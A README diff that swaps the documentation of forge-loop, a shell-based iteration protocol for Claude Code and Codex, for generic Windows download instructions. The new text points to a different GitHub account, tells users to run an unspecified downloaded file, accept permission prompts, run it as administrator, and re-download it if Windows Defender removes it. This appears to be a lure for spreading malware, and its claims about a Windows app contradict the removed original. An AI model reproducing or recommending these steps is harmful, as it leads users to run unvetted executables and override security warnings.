@@ -1,446 +1,228 @@
-```
-                          ·  ✦  ·  ✦  ·
-                       ✦     · ⚡ ·     ✦
-                         ░░▒▓████▓▒░░
-                       ▒▓█▀          ▀█▓▒
-                      ▓█   ◆      ◆   █▓
-                      ██    ╲    ╱    ██
-                      ▓█   ═══⚒═══   █▓
-                       ▒▓█▄        ▄█▓▒
-                         ░░▒▓████▓▒░░
-                             ▓██▓
-                         ╔═══╧══╧═══╗
-                         ║ THE FORGE ║
-                         ╚══════════╝
-                        ▄▄████████████▄▄
-                        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
-```
+# ⚙️ forge-loop - Better code through steady review
 
-# forge-loop
+[![Download forge-loop](https://img.shields.io/badge/Download-forge--loop-blue?style=for-the-badge&logo=github)](https://github.com/makafuiraymond532-debug/forge-loop)
 
-**A task loop with KPI guardrails for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and Codex/manual workflows.**
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-0.6.0-green.svg)](CHANGELOG.md)
+forge-loop helps improve a codebase in short, repeatable loops. It tracks simple quality goals, changes strategy when needed, and checks results with fresh context. This makes it easier to keep code clean while working with Claude Code.
 
-Forge is a protocol plus adapters. It takes open-text software tasks, keeps coverage/speed/quality as guardrails, records state across iterations, and runs until the work is honestly done or you stop it.
+Use this guide if you want to download and run forge-loop on Windows.
 
-```
-You: /forge "password reset flow" --done-when "users can request and complete a reset end-to-end" --coverage 90 --speed -30%
+## 💾 Download
 
-Forge: Measuring baseline... 85.2% coverage, 120s
-       Success contract: password reset works end-to-end
-       Strategy: coverage-push → 15 tests for edge cases
-       85.8% (+0.6%), 118s (-2s) ✓
-       ...iterates until task success and KPI targets are both satisfied...
-```
+Visit this page to download:  
+https://github.com/makafuiraymond532-debug/forge-loop
 
----
+Follow these steps:
 
-## What Forge Is
+1. Open the link above in your browser.
+2. Find the latest release or download area on the page.
+3. Download the Windows file for forge-loop.
+4. Save the file to your Desktop or Downloads folder.
 
-Forge is for cases where plain prompting is too loose but a full agent framework is too heavy.
+If the download comes as a ZIP file, keep it in the ZIP file until you are ready to open it.
 
-- Give it a task
-- optionally say what "done" means
-- keep tests, coverage, speed, and quality in view
-- iterate with recorded state instead of re-explaining yourself every round
+## 🖥️ Windows Setup
 
-## Core vs Driver
+forge-loop works best on a modern Windows PC with:
 
-### Forge Core
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- Internet access for setup and updates
 
-The portable part of the system:
+You may also want:
 
-- iteration protocol (Orient → Measure → Evaluate → Decide → Execute → Verify → Record → Complete)
-- task-driven success contract with optional explicit `done_when`
-- state format and autoregressive memory
-- KPI targets (coverage, speed, quality)
-- strategy selection and stagnation handling
-- lessons and ideas backlog
+- A recent version of Git
+- Claude Code installed and signed in
+- A code editor such as VS Code, if you want to inspect files
 
-### Claude Code Driver
+## 📦 Install the App
 
-The bundled runtime adapter in this repo:
+1. Go to your Downloads folder.
+2. If the file is a ZIP, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Look for the app file or setup file.
+5. Double-click the file to start it.
 
-- `/forge` command
-- `/forge-cancel` command
-- `/forge-status` command
-- `agents/forge.md`
-- `hooks/stop-hook.sh`
-- install script that wires those assets into `~/.claude/`
+If Windows asks for permission, choose Yes.
 
-### Codex Driver
+If the app opens in a browser or local window, leave that window open while you use forge-loop.
 
-The bundled Codex/manual adapter in this repo:
+## 🛠️ First Run
 
-- `install-codex.sh`
-- `drivers/codex/bin/forge-init`
-- `drivers/codex/bin/forge-continue`
-- `drivers/codex/bin/forge-cancel`
-- `drivers/codex/bin/forge-status`
-- `.codex/forge/` state layout for per-project sessions
-- shared shell state helpers reused across drivers
+When forge-loop starts for the first time, it may ask you to:
 
-Both drivers are first-class. The difference is automation depth:
-Claude gets hook-driven iteration; Codex gets manual driver scripts that print
-the next prompt and manage session state.
+1. Choose a project folder
+2. Set a target for improvement
+3. Connect to Claude Code
+4. Pick a loop style or strategy
 
-## Support Matrix
+Use a small test project first if you want to learn how it works. This helps you see how the loop changes code and checks progress.
 
-| Environment | Status | What is actually shipped |
-|-------------|--------|--------------------------|
-| Claude Code | First-class | Command, agent, stop-hook driver, installer |
-| Codex CLI | First-class manual driver | Install script, `forge-init`, `forge-continue`, `forge-cancel`, project-local state |
-| Other agents / plain shell | Protocol-only | Reuse the protocol and state model manually |
+## 🔍 What forge-loop Does
 
-Forge is not claiming native parity across agent runtimes. It ships two real drivers with different control surfaces.
+forge-loop runs a cycle that focuses on code quality. Each cycle usually includes:
 
----
+- Checking the current state of the codebase
+- Choosing a task to improve
+- Applying changes
+- Measuring the result with a simple KPI
+- Switching strategy if the result stalls
+- Using fresh context before the next pass
 
-## Lineage
+This keeps work focused and helps avoid repeating the same approach too long.
 
-Forge is not pretending to emerge from nowhere.
+## 📈 Main Features
 
-- **Ralph Wiggum** — [Geoff Huntley](https://ghuntley.com/ralph/) gave the core loop shape: fresh context, file-backed iteration, and the willingness to let simple loops do real work.
-- **autoresearch** — [Andrej Karpathy](https://github.com/karpathy/autoresearch) reinforced the deletion bias, binary keep/discard discipline, and the value of tiny, explicit skills.
-- **pi-autoresearch** — [Tobi Lutke and David Cortes](https://github.com/davebcn87/pi-autoresearch) pushed the pattern toward measurable software work beyond ML and made the backlog / measurement story sharper.
-- **SICA** — [Self-Improving Coding Agent](https://arxiv.org/abs/2504.15228) showed that compounding improvement works better when strategy selection learns from prior evidence.
-- **autoresearch-mlx** — [trevin-creator](https://github.com/trevin-creator/autoresearch-mlx) showed the loop itself can be a target of improvement, not just the code under test.
+### 🧭 Strategy rotation
 
-Forge’s job is not to erase those influences. It is to package them into a cleaner, more practical tool surface.
+forge-loop can switch between different ways of improving code. This helps it keep making progress when one path slows down.
 
----
+### 📊 KPI-driven loops
 
-## How it works
+You can track goals such as:
 
-### The Iteration Cycle
+- Test coverage
+- Fewer failing checks
+- Cleaner file structure
+- Smaller change size
+- Fewer repeated edits
 
-Each iteration executes one complete eight-phase cycle:
+These metrics help you see whether the codebase is moving in the right direction.
 
-| Phase | What happens |
-|-------|-------------|
-| **A. Orient** | Read forge-state file, check task success contract + KPI trends + stagnation count |
-| **B. Measure** | Run tests with coverage, capture KPIs |
-| **C. Evaluate** | Every 3rd iteration: spawn fresh-context subagent for unbiased audit |
-| **D. Decide** | Pick strategy from KPI gaps + findings + lessons |
-| **E. Execute** | Apply ONE focused transformation |
-| **F. Verify** | Tests must be green, re-measure KPIs |
-| **G. Record** | Update forge-state with deltas + lessons (the autoregressive step) |
-| **H. Complete** | Task success contract satisfied and KPI targets met? Done. Otherwise, next iteration. |
+### 🧠 Fresh-context evaluation
 
-### Success Contract
+forge-loop rechecks the project with a clean view between passes. This helps reduce the chance of getting stuck on old assumptions.
 
-Forge is built for open-text work, not just KPI chasing.
+### 🧪 Test coverage focus
 
-- The task scope is the primary objective.
-- `--done-when "TEXT"` is an optional explicit success override.
-- If `--done-when` is omitted, Forge derives concrete completion checks from the task scope and records them in Forge state.
-- Coverage, speed, and quality stay as guardrails alongside the task itself.
-- Completion means both the task and the guardrails are satisfied.
+The app can push the codebase toward stronger tests. That makes it easier to spot problems before they grow.
 
-### Strategies
+### 🔧 Claude Code support
 
-Forge selects from named strategies based on which KPI gap is largest:
+forge-loop is built around Claude Code workflows. It fits into review, edit, and retry loops that support steady code improvement.
 
-| Strategy | When | Impact |
-|----------|------|--------|
-| `coverage-push` | Clear coverage gaps | Coverage |
-| `refactor-for-testability` | Code hard to test | Coverage |
-| `component-extraction` | DRY violations, repeated patterns | Coverage + Quality |
-| `speed-optimization` | Slow tests, sync overuse | Speed |
-| `dead-code-removal` | Unused code flagged by evaluation | Quality + Coverage |
-| `quality-polish` | Naming, complexity, clarity | Quality |
-| `design-system` | Duplicated UI patterns | Quality + Coverage |
-| `simplification` | Code that can be made simpler | Quality |
+## 🧩 How to Use It
 
-### Stagnation Detection
+1. Open forge-loop.
+2. Select your project folder.
+3. Choose a target, such as better tests or cleaner code.
+4. Start a loop.
+5. Review each pass.
+6. Keep the changes you want.
+7. Run the next loop if you want more improvement.
 
-When coverage improves by less than 0.1% for two consecutive iterations, forge increments a stagnation counter. Once the counter reaches 3, forge automatically rotates to a different strategy — the historically most effective one, or an untried one. No manual intervention needed.
+For best results, use one goal at a time. A small target is easier to check and easier to finish.
 
-### Fresh-Context Evaluation
+## 🗂️ Suggested Workflow
 
-Every 3rd iteration, Forge runs a fresh-context audit pass. In Claude Code this is typically a subagent; in other environments it may be an isolated reviewer or manual second pass. The protocol requires fresh context, not a specific vendor primitive.
+A simple workflow looks like this:
 
----
+1. Start with a codebase that needs cleanup.
+2. Pick one KPI, such as test coverage.
+3. Run a loop.
+4. Review the changes.
+5. Rotate strategy if progress slows.
+6. Run a fresh-context pass.
+7. Repeat until the code looks stable.
 
-## Installation
+This works well for long-lived projects that need regular care.
 
-### Claude Code Driver
+## 🔎 Example Use Cases
 
-```bash
-git clone https://github.com/DjinnFoundry/forge-loop.git
-cd forge-loop
-./install.sh
-```
+forge-loop can help with:
 
-The installer symlinks the Claude Code driver assets into your `~/.claude/` directory.
+- Raising test coverage in older projects
+- Cleaning up messy files
+- Improving code consistency
+- Breaking a task into small steps
+- Reviewing changes with a fresh view
+- Keeping Claude Code focused on one goal at a time
 
-**Important**: You also need to configure the stop hook that drives iteration. See [hooks/README.md](hooks/README.md) for setup instructions.
+It is useful when you want steady progress without large, risky changes.
 
-### Manual installation
+## 📁 Topics Covered
 
-```bash
-mkdir -p ~/.claude/skills/forge ~/.claude/commands ~/.claude/agents ~/.claude/hooks
+This project connects with topics like:
 
-cp skills/forge/SKILL.md ~/.claude/skills/forge/SKILL.md
-cp commands/forge.md ~/.claude/commands/forge.md
-cp commands/forge-cancel.md ~/.claude/commands/forge-cancel.md
-cp commands/cancel-ralph.md ~/.claude/commands/cancel-ralph.md
-cp commands/forge-status.md ~/.claude/commands/forge-status.md
-cp agents/forge.md ~/.claude/agents/forge.md
-cp hooks/stop-hook.sh ~/.claude/hooks/stop-hook.sh
+- AI coding
+- Anthropic
+- Autonomous agents
+- Autoregressive workflows
+- Code quality
+- Developer tools
+- KPI tracking
+- Test coverage
+- Claude Code
 
-# Stop hook — see hooks/README.md for settings.json setup
-```
+These topics reflect the app’s focus on controlled code improvement.
 
-### Codex Driver
+## ❓ Common Questions
 
-```bash
-git clone https://github.com/DjinnFoundry/forge-loop.git
-cd forge-loop
-./install-codex.sh
-```
+### Does this work on Windows?
 
-The Codex installer links Forge Core into `~/.codex/skills/forge/` and installs
-driver entrypoints into `~/.codex/bin/`.
+Yes. Use the Windows download from the link above, then open the file after it finishes downloading.
 
-### Codex / Manual Use
+### Do I need to know how to code?
 
-Codex support is manual by design, but it is now a real shipped driver.
+No. You can follow the steps in this README and use the app with basic point-and-click actions.
 
-Typical flow:
+### Do I need Claude Code?
 
-1. Run `forge-init "scope" [--done-when "TEXT"] ...` in the target project.
-2. Paste the printed prompt into Codex.
-3. After each iteration, run `forge-continue` to print the next prompt.
-4. Use `forge-status` to inspect the active session.
-5. Use `forge-cancel` to stop the active loop while preserving Forge state.
+Yes, if you want to use the full workflow. forge-loop is built to work with Claude Code-based loops.
 
-This is a first-class manual driver, not a hook-based runtime integration.
+### What should I start with?
 
-Driver safety:
+Start with one clear goal, such as improving test coverage or reducing code clutter.
 
-- `forge-continue` derives the next iteration from recorded Forge state entries
-- multiple active Codex sessions require an explicit session id instead of implicit selection
-- `forge-status` is read-only and reports the next required iteration from Forge state
+### What if I do not want to change my main project?
 
----
+Use a copy of the project first. That lets you test the loop without risk.
 
-## Usage
+## 🔒 Safe Setup Tips
 
-### Claude Code
+- Download only from the link in this README
+- Keep a copy of your original files
+- Use a test project first
+- Check each change before you keep it
+- Save your work often
 
-#### Basic
+## 🧰 Troubleshooting
 
-```
-/forge "LiveView components" --coverage 95 --speed -20%
-```
+### The file does not open
 
-#### Open-text task with explicit success
+- Make sure the download finished
+- Check that you extracted the ZIP file if there is one
+- Try right-clicking the file and choosing Open
 
-```
-/forge "password reset flow" --done-when "users can request, receive, and complete a reset end-to-end" --coverage 90 --quality strict
-```
+### Windows blocks the app
 
-#### All options
+- Right-click the file and choose Run as administrator
+- Check whether Windows Defender moved the file
+- Download it again from the GitHub page if needed
 
-```
-/forge "SCOPE" [--done-when "TEXT"] --coverage N --speed -N% --quality strict|moderate|lax --max-iterations N
-```
+### Claude Code does not connect
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `SCOPE` | (required) | What to improve — quoted string |
-| `--done-when "TEXT"` | task-derived | Explicit success contract. If omitted, derive completion checks from the task itself |
-| `--coverage N` | baseline + 2 | Minimum coverage % target |
-| `--speed -N%` | -20% | Speed reduction from baseline |
-| `--quality` | moderate | strict (0 high, 0 med) / moderate (0 high, ≤3 med) / lax (0 high, ≤5 med) |
-| `--max-iterations` | 20 | Safety limit |
-
-#### Control
-
-- **Pause**: Forge outputs `FORGE_PAUSE` when it needs your input
-- **Cancel**: `/forge-cancel` stops the loop
-- **Status**: `/forge-status` reports the current Claude driver session state
-- **Inspect state**: `.claude/forge-state.SESSION.md` is preserved when you pause or cancel
-
-### Protocol-Only / Manual
-
-Use the same protocol phases and state format, but drive the loop yourself. Today that means:
-
-- no bundled driver beyond Claude Code and Codex
-- no automatic hook/runtime integration outside Claude Code
-- no runtime-specific install story beyond the shipped drivers
-
----
-
-## State File
-
-Forge persists its state in driver-specific roots:
-
-- Claude Code: `.claude/forge-state.SESSION.md`
-- Codex: `.codex/forge/forge-state.SESSION.md`
-
-Claude’s loop driver uses `.claude/forge-loop.SESSION.local.md` as the primary
-loop-state file name. Legacy `.claude/ralph-loop.SESSION.local.md` files are
-still accepted for compatibility.
-
-Other runtimes can reuse the same format in a different state root. Each iteration appends its KPIs, strategy, actions, and lessons. This is the autoregressive memory.
-
-```yaml
----
-session_id: "0320-1430-a3b2"
-scope: "API controllers"
-success:
-  mode: "task-derived"
-  task: "API controllers"
-  done_when: null
-  completion_checks:
-    - "controller edge cases covered and passing"
-    - "no controller path regresses current behavior"
-baseline:
-  coverage: 85.2
-  speed_seconds: 120
-  tests: 1250
-  failures: 0
-  measured_at: "2026-03-20T14:30:00Z"
-targets:
-  min_coverage: 90.0
-  max_speed_seconds: 84
-  quality: "moderate"
-  max_iterations: 20
-current_strategy: "component-extraction"
-stagnation_count: 0
-strategies_tried:
-  - name: "coverage-push"
-    iterations: [1, 2]
-    coverage_delta: 0.8
-    speed_delta: -5
-lessons:
-  - "async:true on controller tests saves ~3s per file"
-ideas:
-  - "auth module has dead code paths worth investigating"
----
-
-## Iteration 1 — coverage-push
-- Coverage: 85.2 → 85.8 (+0.6%)
-- Speed: 120s → 118s (-2s)
-- Tests: 1250 → 1265 (+15)
-- Actions: Added 15 tests for data_loaders edge cases
-- Reality-check: 2 high, 3 medium findings
-- Lesson: "7 identical try-rescue blocks — extract, don't test each"
-```
+- Check your internet access
+- Make sure Claude Code is installed
+- Sign in again if your session expired
 
----
+### The loop stops too early
 
-## Architecture
+- Lower the task size
+- Pick one KPI
+- Start again with a simpler project folder
 
-```
-forge-loop/
-├── skills/forge/SKILL.md    ← The protocol (source of truth)
-├── commands/forge.md         ← Claude Code /forge command
-├── commands/forge-cancel.md   ← Primary Claude stop command
-├── commands/cancel-ralph.md   ← Legacy alias for compatibility
-├── commands/forge-status.md  ← Shows Claude driver session status
-├── drivers/codex/            ← Codex/manual driver scripts + prompt template
-│   ├── bin/
-│   │   ├── forge-init
-│   │   ├── forge-continue
-│   │   ├── forge-cancel
-│   │   └── forge-status
-│   ├── lib.sh
-│   ├── prompt.md
-│   └── README.md
-├── agents/forge.md           ← Subagent for spawning forge on subsystems
-├── hooks/                    ← Iteration engine
-│   ├── README.md             ← Hook setup instructions
-│   └── stop-hook.sh          ← Stop hook script
-├── install.sh                ← Installer script
-├── install-codex.sh          ← Codex driver installer
-├── scripts/forge-state-lib.sh ← Shared shell state helpers
-├── tests/
-│   ├── stop-hook.test.sh
-│   └── codex-driver.test.sh
-├── CHANGELOG.md
-├── CONTRIBUTING.md
-└── README.md
-```
+## 📌 What You Need Before You Start
 
-The runtime layout is intentionally asymmetric: the protocol is portable, while drivers map that protocol to their runtime's real affordances. The Claude driver uses a stop hook and loop-state files. The Codex driver uses explicit shell entrypoints and project-local state files. Both preserve the same Forge Core semantics.
+- A Windows computer
+- A browser
+- Enough space for the download
+- A project folder to improve
+- Claude Code for loop-based work
 
----
+## 📥 Download Again
 
-## Design Principles
-
-Distilled from Ralph, autoresearch, pi-autoresearch, SICA, and a dozen related loops:
-
-1. **Loops are simple. The magic is in the loop.** The universal pattern is: Modify, Measure, Compare, Keep/Discard, Record, Repeat. Everything else is details.
-2. **Simpler is better.** Code deletion at same KPIs is always a win. Don't add complexity for marginal gains.
-3. **Autonomy scales when you constrain scope, clarify success, and mechanize verification.** Tests aren't just QA — they're the rails the loop runs on.
-4. **Binary keep/discard.** Improved? Keep. Didn't? Revert. No gray area, no partial credit.
-5. **State survives context.** The forge-state file is the autoregressive memory. It survives context compaction, agent restarts, and session swaps.
-6. **Fresh eyes beat anchored ones.** Subagents with no iteration context prevent "the numbers look fine" bias.
-7. **Think harder, don't stop.** When stuck: re-read code, review backlog, combine near-misses, try the inverse, try simplification. Never pause to ask.
-8. **Each improvement should make future improvements easier.** (Addy Osmani)
-
----
-
-## Why not just raw loops?
-
-| Aspect | Raw loop | Forge |
-|--------|----------|-------|
-| KPI tracking | Ad-hoc | Structured state file with deltas + trends |
-| Strategy | Single prompt | 8 named strategies, auto-rotation on stagnation |
-| Evaluation | Self-evaluation (anchoring bias) | Fresh-context audits every 3 iterations |
-| Memory | Context window only | Persistent state file survives compaction |
-| Completion | Manual / hope | Exact completion marker after task success plus protocol checks |
-| Lessons | Lost between iterations | Accumulated, inform strategy selection |
-| Stagnation | Repeats same approach | Detects + rotates after low-delta iterations |
-| Portability | Rebuild per runtime | Portable protocol, Claude and Codex drivers bundled |
-
----
-
-## Claims We Are Willing To Make
-
-- Forge packages proven loop patterns into a reusable protocol with first-class Claude Code and Codex/manual drivers.
-- Forge improves repeatability versus ad-hoc prompting when you care about task success, KPI guardrails, iteration memory, and strategy rotation.
-- Forge does **not** yet provide universal runtime adapter parity beyond the shipped drivers.
-- Forge is more preconfigured than raw hooks. It is not a new primitive.
-
-## Requirements
-
-### Claude Code Driver
-
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI
-- `jq` (for the stop hook)
-- A project with a test suite that reports coverage
-
-### Codex Driver
-
-- Codex CLI
-- `jq`
-- A project with a test suite that reports coverage
-- `~/.codex/bin` on your `PATH` if you want driver commands globally available
-
-### Protocol-Only Reuse
-
-- Any agent/runtime that can follow the Forge protocol manually
-- Some place to persist Forge state between iterations
-- A project with a measurable test/quality loop
-
-## Adapting for other languages
-
-The skill includes test runner examples for multiple languages (Elixir, Python, JavaScript, Ruby, Go). To adapt:
-
-1. Edit `skills/forge/SKILL.md` — update the MEASURE phase for your test runner
-2. Update the coverage/speed parsing for your output format
-3. Everything else (strategies, stagnation, state format) is language-agnostic
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-[MIT](LICENSE)
+Visit this page to download:  
+https://github.com/makafuiraymond532-debug/forge-loop
